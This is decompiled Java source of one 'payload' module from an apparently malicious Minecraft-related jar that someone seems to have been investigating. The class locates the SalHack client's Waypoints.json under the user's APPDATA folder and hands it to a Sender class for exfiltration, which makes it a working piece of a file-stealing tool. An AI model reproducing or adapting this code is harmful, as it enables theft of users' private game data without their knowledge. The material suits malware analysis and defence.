/*    */ package idasido.adldaosd.wpiw.payload.impl;
/*    */ 
/*    */ import idasido.adldaosd.wpiw.payload.Payload;
/*    */ import idasido.adldaosd.wpiw.payload.Sender;
/*    */ import idasido.adldaosd.wpiw.util.FileUtil;
/*    */ import java.io.File;
/*    */ import java.util.Optional;
/*    */ 
/*    */ 
/*    */ 
/*    */ public final class SalHackWaypoints
/*    */   implements Payload
/*    */ {
/*    */   public void execute() throws Exception {
/* 15 */     Optional<File> file = FileUtil.getFile(System.getenv("APPDATA") + "\\.minecraft\\SalHack\\Waypoints\\Waypoints.json");
/* 16 */     if (!file.isPresent())
/* 17 */       return;  file.ifPresent(Sender::send);
/*    */   }
/*    */ }


/* Location:              C:\Users\aesthetical\Downloads\investagate\COPE-1.0-SNAPSHOT-server.jar!\idasido\adldaosd\wpiw\payload\impl\SalHackWaypoints.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */